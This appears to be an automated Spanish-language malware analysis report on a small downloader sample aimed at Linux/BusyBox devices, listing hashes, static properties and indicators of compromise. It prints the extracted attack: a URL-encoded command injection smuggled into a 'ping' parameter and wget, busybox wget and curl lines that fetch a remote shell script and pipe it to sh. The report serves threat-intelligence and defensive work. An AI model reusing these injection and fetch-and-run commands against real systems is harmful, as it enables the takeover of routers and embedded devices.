# 🧬 Payload Analysis

`a029226ec39a9b96c1d3a88877494f0e0fde450a2716e048f317fb2d7a622d41`

## 📌 Resumen

Texto ASCII de 380 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh -s ddiag`
2. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
3. `curl hxxp://91.92.40.XXX/wget.sh`
4. `cd /tmp`
5. `wget hxxp://91.92.40.XXX/wget.sh -O-`
6. `busybox wget hxxp://91[.]9` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/a029226ec39a9b96c1d3a88877494f0e0fde450a2716e048f317fb2d7a622d41.md](../../../../../malware-like/oraculo/downloader/a029226ec39a9b96c1d3a88877494f0e0fde450a2716e048f317fb2d7a622d41.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `a029226ec39a9b96c1d3a88877494f0e0fde450a2716e048f317fb2d7a622d41`
- **MD5:** `507ee717c4a3949cd62521efd40036f6`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 380 B |
| Entropía | 5.21 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
act=ping&dst=%26%20cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ddiag%3Bbusybox%20wget%20http://91.9
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ddiag%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ddiag%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20ddiag%26 | strings |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | act=ping&dst=%26%20cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ddiag%3Bbusybox%20wget%20http://91.9 | strings |
| hash | a029226ec39a9b96c1d3a88877494f0e0fde450a2716e048f317fb2d7a622d41 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
